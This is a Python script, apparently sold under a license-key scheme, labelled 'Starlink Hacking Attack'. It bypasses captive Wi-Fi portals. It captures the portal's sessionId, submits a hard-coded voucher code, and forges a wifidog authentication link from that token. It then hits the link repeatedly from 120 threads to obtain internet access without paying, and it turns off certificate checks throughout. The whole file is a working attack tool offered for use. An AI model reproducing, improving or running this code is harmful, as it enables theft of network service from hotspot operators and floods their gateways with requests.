import requests, re, urllib3, time, threading, os, random, hashlib, platform, ssl, json
import subprocess
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

# --- SSL Error & Warnings Bypass ---
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
KEY_URL = "https://raw.githubusercontent.com/kyawnanda2002/Starlink/main/key.txt"
LICENSE_FILE = ".Leo_sell.lic" 

def get_hwid():
    ID_STORAGE = ".device_id" 

    if os.path.exists(ID_STORAGE):
        with open(ID_STORAGE, "r") as f:
            return f.read().strip()

    try:
        serial = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
        if not serial or serial == "unknown" or "012345" in serial:
            serial = subprocess.check_output("settings get secure android_id", shell=True).decode().strip()
        if not serial:
            import uuid
            serial = str(uuid.getnode())
        raw_hash = hashlib.md5(serial.encode()).hexdigest()[:10].upper()
        new_id = f"TRB-{raw_hash}"
    except:
        new_id = f"TRB-{hashlib.md5(str(os.getlogin()).encode()).hexdigest()[:10].upper()}"

    with open(ID_STORAGE, "w") as f:
        f.write(new_id)
    return new_id

def banner():
    os.system('clear')
    
    print("\033[95m" + "        ✨ Developer @paing07709 - Starlink Hacking Attack ✨")

def save_license(hwid, key, expiry):
    data = {"id": hwid, "key": key, "expiry": expiry}
    with open(LICENSE_FILE, "w") as f:
        json.dump(data, f)

def load_license():
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                return json.load(f)
        except:
            return None
    return None

def check_license():
    hwid = get_hwid()
    banner()

    # ၁။ Local License စစ်ဆေးခြင်း (Offline)
    local_data = load_license()
    if local_data and local_data.get("id") == hwid:
        try:
            # Format နှစ်မျိုးလုံးကို စစ်ဆေးခြင်း
            try:
                expiry_date = datetime.strptime(local_data["expiry"], "%d-%m-%Y %H:%M")
            except ValueError:
                expiry_date = datetime.strptime(local_data["expiry"], "%d-%m-%Y")

            if datetime.now() < expiry_date:
                remaining = expiry_date - datetime.now()
                days = remaining.days
                hours, rem = divmod(remaining.seconds, 3600)
                minutes, _ = divmod(rem, 60)

                print(f"\033[92m[✓] AUTO-LOGIN SUCCESS! (Offline Mode)\033[0m")
                print(f"\033[94m[*] REMAINING: {days}d {hours}h {minutes}m\033[0m")
                time.sleep(1.5)
                return True
        except:
            pass

    # ၂။ Online ကနေ License စစ်ဆေးခြင်း
    print(f"\033[94m[*] YOUR DEVICE ID: {hwid}\033[0m")
    input_key = input("\033[93m[>] ENTER ACCESS KEY: \033[0m").strip()

    print("\033[93m[*] Verifying license online...\033[0m")
    try:
        response = requests.get(KEY_URL, timeout=10, verify=False).text
        lines = response.splitlines()

        for line in lines:
            if "|" in line:
                parts = line.split("|")
                if len(parts) == 3:
                    db_id, db_key, db_date = parts
                    if db_id.strip() == hwid and db_key.strip() == input_key:

                        # Date parsing (ရက်စွဲ သို့မဟုတ် နာရီ/မိနစ်)
                        try:
                            expiry_date = datetime.strptime(db_date.strip(), "%d-%m-%Y %H:%M")
                        except ValueError:
                            expiry_date = datetime.strptime(db_date.strip(), "%d-%m-%Y")

                        if datetime.now() < expiry_date:
                            save_license(hwid, input_key, db_date.strip())
                            print(f"\033[92m[✓] ACCESS GRANTED!\033[0m")
                            print(f"\033[94m[*] EXPIRES AT: {db_date}\033[0m")
                            time.sleep(2)
                            return True
                        else:
                            print("\033[91m[!] KEY EXPIRED! PLEASE RENEW.\033[0m")
                            return False

        print("\033[91m[!] INVALID KEY OR DEVICE ID NOT REGISTERED.\033[0m")
        return False
    except Exception:
        print("\033[91m[!] DATABASE ERROR: Please check your internet.\033[0m")
        return False

def check_net():
    try:
        return requests.get("http://www.google.com/generate_204", timeout=3).status_code == 204
    except:
        return False

def high_speed_pulse(link):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f"\033[92m[✓] Dev_@Paing07709| >>> [{random.randint(40,180)}ms]\033[0m")
            time.sleep(0.01)
        except:
            time.sleep(1)
            break

def start_immortal():
    if not check_license():
        return

    while True:
        session = requests.Session()
        try:
            print("\033[94m[*] Dev_@Paing07709 Scanning Portal...\033[0m")
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)

            p_url = r.url
            r1 = session.get(p_url, verify=False, timeout=5)
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, match.group(1)) if match else p_url
            r2 = session.get(n_url, verify=False, timeout=5)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]

            if sid:
                print(f"\033[96m[✓] Aladdin SID Captured: {sid[:15]}\033[0m")
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)

                gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"

                print("\033[95m[*] ⚡ Launching High-Speed Stable Threads ⚡\033[0m")
                for _ in range(120):
                    threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()

                while True:
                    if not check_net():
                        print("\033[91m[!] Connection Lost! Re-injecting...\033[0m")
                        break
                    time.sleep(5)
            else:
                time.sleep(2)
        except:
            time.sleep(2)

if __name__ == "__main__":
    try:
        start_immortal()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Script Stopped by User.\033[0m")
        
